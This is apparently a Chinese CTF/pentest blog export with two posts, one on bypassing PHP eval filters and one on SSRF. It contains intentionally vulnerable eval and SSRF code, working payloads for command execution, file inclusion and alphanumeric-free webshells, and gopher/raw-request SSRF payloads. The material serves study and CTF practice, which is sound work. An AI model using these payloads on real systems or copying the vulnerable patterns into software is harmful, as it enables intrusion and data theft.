      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过长度"><a href="#绕过长度" class="headerlink" title="绕过长度"></a>绕过长度</h2><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$get</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$get</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too long.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$get</span>);</span><br><span class="line">          &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>命令执行绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;&amp;<span class="number">1</span>=bash</span><br></pre></td></tr></table></figure></li><li><p>远程文件包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];</span><br></pre></td></tr></table></figure></li><li><p>本地文件包含</p><ul><li>file_put_contents</li><li>日志文件包含</li></ul></li><li><p>利用变长参数特性展开数组–<strong>php 5.6</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);&amp;<span class="number">2</span>=assert</span><br><span class="line">POST:param=<span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure></li></ul><h2 id="绕过前置混淆字符"><a href="#绕过前置混淆字符" class="headerlink" title="绕过前置混淆字符"></a>绕过前置混淆字符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">str = 任意字符串</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>闭合php标签</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> payload; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>换行绕过</p><ul><li>%0a</li><li>\n</li><li>\r</li></ul></li></ol><h2 id="绕过字符种类数量"><a href="#绕过字符种类数量" class="headerlink" title="绕过字符种类数量"></a>绕过字符种类数量</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>] </span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        temp.add(<span class="built_in">hex</span>(d))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp), temp)</span><br></pre></td></tr></table></figure><blockquote><p>result2中的字符用result中的字符代替，d&#x3D;a^b^c^d,这样就减少了一种字符种类</p></blockquote><h2 id="爆破可用字符-x2F-可用函数"><a href="#爆破可用字符-x2F-可用函数" class="headerlink" title="爆破可用字符&#x2F;可用函数"></a>爆破可用字符&#x2F;可用函数</h2><blockquote><p>在浏览器中查看结果</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$preg</span> =<span class="string">&#x27;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&#x27;</span>;</span><br><span class="line">可用字符</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span>=<span class="number">0</span>;<span class="variable">$a</span>&lt;<span class="number">128</span>;<span class="variable">$a</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#可用函数</span></span><br><span class="line"><span class="comment">#获取内置函数 </span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="variable">$value</span>) )&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><h2 id="数学函数构造payload"><a href="#数学函数构造payload" class="headerlink" title="数学函数构造payload"></a>数学函数构造payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;706870696e666f&#x27;</span>) →phpinfo</span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;73797374656d&#x27;</span>)  → system  </span><br></pre></td></tr></table></figure><h4 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">system</span>(cat /flag)</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">黑名单：空格,\t,\r,\n,<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;&quot;</span>,[]</span><br><span class="line">    </span><br><span class="line">正则匹配表达式：/[a-zA-Z_\x7f-\xff][a-zA-Z_0-<span class="number">9</span>\x7f-\xff]*/</span><br><span class="line">正则匹配到的部分进行白名单过滤    </span><br><span class="line">白名单：只能使用数学函数  </span><br><span class="line"></span><br><span class="line">这里利用php的动态函数</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(cat /flag);</span><br><span class="line">等价与<span class="title function_ invoke__">system</span>(cat /flag)</span><br><span class="line">所以我们需要构造<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]=system <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]=cat /flag  <span class="variable">$a</span>(<span class="variable">$b</span>)</span><br><span class="line"></span><br><span class="line">需要我们构造的是_GET和[]，[]可以用&#123;&#125;替代，_GET用<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(_GET对应的十进制))</span><br><span class="line">因为有正则，所以只能用不含有字母的进制如<span class="number">10</span>进制或者<span class="number">8</span>进制，所以需要用dechex将<span class="number">10</span>进制转为<span class="number">16</span>进制</span><br><span class="line">hex2bin也不能出现，用<span class="title function_ invoke__">base_convert</span>()来生成：</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">432335067717</span>,<span class="number">8</span>,<span class="number">36</span>)</span><br><span class="line"> </span><br><span class="line">将_GET保存在变量中（为了保证长度小于<span class="number">80</span>）</span><br><span class="line"><span class="variable">$pi</span>=<span class="variable">$base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(_GET对应的十进制))→_GET</span><br><span class="line"><span class="variable">$$pi</span>&#123;pi&#125;→<span class="variable">$_GET</span>[pi]</span><br><span class="line"><span class="variable">$$pi</span>&#123;abs&#125;→<span class="variable">$_GET</span>[abs]</span><br><span class="line"></span><br><span class="line">最终payload：</span><br><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;pi&#125;(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag    </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220626151220775-1687682103386.png" alt="image-20220626151220775"></p><p><img src="/../images/image-20220626151314181-1687682103387.png" alt="image-20220626151314181"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不直接用hex2bin(dechex(system cat /flag对应的十进制))是因为数值超过dechex的处理范围，返回为0</span><br></pre></td></tr></table></figure><h2 id="无字母数字和一些符号"><a href="#无字母数字和一些符号" class="headerlink" title="无字母数字和一些符号"></a>无字母数字和一些符号</h2><p><a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用空字符-运算构造"><a href="#利用空字符-运算构造" class="headerlink" title="利用空字符^运算构造"></a>利用空字符^运算构造</h4><ul><li><p>单个字符</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">127</span>;<span class="variable">$i</span>&lt;<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">127</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s^%s&quot;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)),<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>))).<span class="string">&quot;=&gt;&quot;</span>. (<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">%<span class="number">8</span>C^%FF=&gt;s</span><br></pre></td></tr></table></figure><blockquote><p>((%FE^%AE).(%FE^%96).(%FE^%AE).(%FE^%97).(%FE^%90).(%FE^%98).(%FD^%92))(); →phpinfo();</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">#想构造的字符串  print_r(scandir(&#x27;.&#x27;))</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;scandir&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$payload</span> .= <span class="string">&#x27;%ff&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>.=<span class="string">&#x27;^&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">127</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">#chr(255)选择哪一个不可见字符来构造</span></span><br><span class="line">        <span class="variable">$k</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k</span> == <span class="variable">$x</span>[<span class="variable">$i</span>]) </span><br><span class="line">      &#123;</span><br><span class="line">            <span class="variable">$payload</span> .= <span class="string">&#x27;%&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><blockquote><p>$</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2023/05/31/SSRF/"/>
      <url>/2023/05/31/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>SSRF</code>（Server-Side Request Forgery，服务器端请求伪造）是一种<strong>由攻击者构造请求，利用服务器端发起请求</strong>的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。</p><p>​ </p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>目标服务器会从自身发起请求，并且该请求可控以及没有对请求地址进行过滤和限制。</p><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><ul><li><p>请求外部资源，如导入文件，加载远程图片，RSS订阅等</p></li><li><p>数据库内置的加载外部URL功能</p></li><li><p>Webmail收取其他邮箱邮件，如POP3,IMAP,SMTP等</p></li><li><p>文件处理，编码处理，属性信息处理，如FFmpeg，ImageMagic,Word,Excel,PDF,XML等</p><p><a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0205699">56视频FFmpeg解析漏洞导致SSRF | wooyun-2016-0205699| WooYun.org</a></p></li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=</span><br><span class="line">搜狗搜索某处SSRF漏洞</span><br><span class="line">?path=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230613212738906.png" alt="image-20230613212738906"></p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><ul><li>openssl</li><li>鉴权，如cookie，jwt等，当攻击者只能控制一个url时，而无法添加这些请求头时，就无法访问某些接口</li><li>校验了其他http header字段时，如referer，UA等</li></ul><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ul><li><p>内网探针，获取内网结构和内网机器指纹</p></li><li><p>若内网主机存在漏洞，可以使用gopher协议构造数据包对其发起攻击</p></li></ul><p>From 国光师傅的ssrf靶场拓扑图</p><p><img src="/../images/16205694239190.png" alt="img"></p><blockquote><p>172.72.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 8080，此时攻击者通过这个 8080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。</p></blockquote><h2 id="产生漏洞的函数"><a href="#产生漏洞的函数" class="headerlink" title="产生漏洞的函数"></a>产生漏洞的函数</h2><ul><li><p><code>file_get_contents</code></p><blockquote><p>将整个文件读入一个字符串</p><p>支持本地文件和远程文件</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804190900308.png" alt="image-20220804190900308"></p></li><li><p><code>curl_exec()</code></p><blockquote><p>执行给定的 curl 会话。</p><p><a href="https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init">Call to undefined function curl_init()错误解决</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191212091.png" alt="image-20220804191212091"></p></li><li><p><code>fsockopen</code></p><blockquote><p>使用socket跟服务器建立tcp连接，传输原始数据。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$data</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//$fp:TCP连接  $data:请求头</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">base6e_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="comment">//执行http请求，并获得返回值</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">GetFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo</span><br><span class="line"></span><br><span class="line">data--&gt;</span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191713087.png" alt="image-20220804191713087"></p></li></ul><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>检测到存在SSRF漏洞后</p><ul><li>探测主机存活情况</li><li>探测存活主机端口情况</li><li>根据端口情况尝试攻击</li></ul><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>攻击的数据需要经过两次URL编码，因为数据是先到达有SSRF漏洞的主机，再通过SSRF漏洞转交给内网其他主机处理。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="常用协议介绍"><a href="#常用协议介绍" class="headerlink" title="常用协议介绍"></a>常用协议介绍</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><blockquote><p><strong>cURL</strong>是一个利用URL语法在命令行下工作的文件传输工具。</p><p>它的名字就是客户端（client）的 URL 工具的意思。</p></blockquote><p><code>curl -v www.baidu.com</code></p><p>-v：显示请求头和响应头</p><p><img src="/../images/image-20220805214719676.png" alt="image-20220805214719676"></p><p><code>curl -V</code></p><p><img src="/../images/image-20220804184555137.png" alt="image-20220804184555137"></p><p>可以看到支持的协议如下</p><table><thead><tr><th><strong>dict</strong></th><th><strong>file</strong></th><th><strong>ftp</strong></th><th><strong>pop3</strong></th><th><strong>pop3s</strong></th></tr></thead><tbody><tr><td><strong>ftos</strong></td><td><strong>gopher</strong></td><td><strong>gophers</strong></td><td><strong>rtmp</strong></td><td><strong>rtsp</strong></td></tr><tr><td><strong>http</strong></td><td><strong>https</strong></td><td><strong>imap</strong></td><td><strong>scp</strong></td><td><strong>sftp</strong></td></tr><tr><td><strong>imaps</strong></td><td><strong>ldap</strong></td><td><strong>ldaps</strong></td><td><strong>smb</strong></td><td><strong>smbs</strong></td></tr><tr><td><strong>smtp</strong></td><td><strong>smtps</strong></td><td><strong>telnet</strong></td><td><strong>tftp</strong></td><td><strong>mtt</strong></td></tr></tbody></table><h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h4><blockquote><p>gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，支持发出GET、POST请求，可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。</p></blockquote><p><img src="/../images/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.jpg" alt="img"></p><ul><li>坑点</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl gopher://localhost:2222/khaz%0atest%0ahaha </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ nc -lvp 2222</span><br><span class="line">listening on [any] 2222 ...</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 50546</span><br><span class="line">haz</span><br><span class="line">test</span><br><span class="line">haha</span><br></pre></td></tr></table></figure><p>会发现接收到的消息是分行的，而且第一行只接收到了haz，k被‘吃掉’了。</p><p>所以在使用gopher协议时<strong>需要在url后加入一个任意字符</strong>才行。</p><ul><li><p>get&#x2F;post请求</p><blockquote><p>1、构造HTTP数据包</p><p>2、URL编码、替换回车换行为%0d%0a,<br>3、发送gopher协议</p></blockquote><p>注意HTTP数据包中必须要有下面四个请求头</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: 192.168.244.128</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">  </span><br><span class="line">a=khaz</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#转换脚本</span></span><br><span class="line">uri = <span class="string">&#x27;/flag.php&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1:80&#x27;</span></span><br><span class="line">content = <span class="string">&#x27;key=90bb4d9d9946905d6d9d68358d7c0360&#x27;</span></span><br><span class="line">content_length = <span 